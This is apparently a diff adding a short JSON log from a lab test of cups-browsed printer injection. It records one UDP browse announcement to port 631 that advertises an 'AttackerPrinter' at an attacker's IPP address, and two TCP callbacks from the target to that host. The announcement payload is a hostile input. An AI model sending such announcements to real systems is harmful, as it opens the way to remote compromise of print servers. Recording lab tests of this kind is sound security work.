@@ -1,0 +1,22 @@
+[
+  {
+    "timestamp": "2026-11-09T12:09:48.391107",
+    "variation": 1,
+    "description": "Standard CUPS browsing announcement",
+    "src_ip": "172.18.0.1",
+    "src_port": 21757,
+    "dst_ip": "172.18.0.2",
+    "dst_port": 631,
+    "payload": "0 3 ipp://172.18.0.1:8631/printers/NAME \"Kali Lab\" \"AttackerPrinter\""
+  },
+  {
+    "timestamp": "2026-11-09T12:10:04.424716",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:49562 > 172.18.0.1:8631 S"
+  },
+  {
+    "timestamp": "2026-11-09T12:10:04.424943",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:49566 > 172.18.0.1:8631 S"
+  }
+]
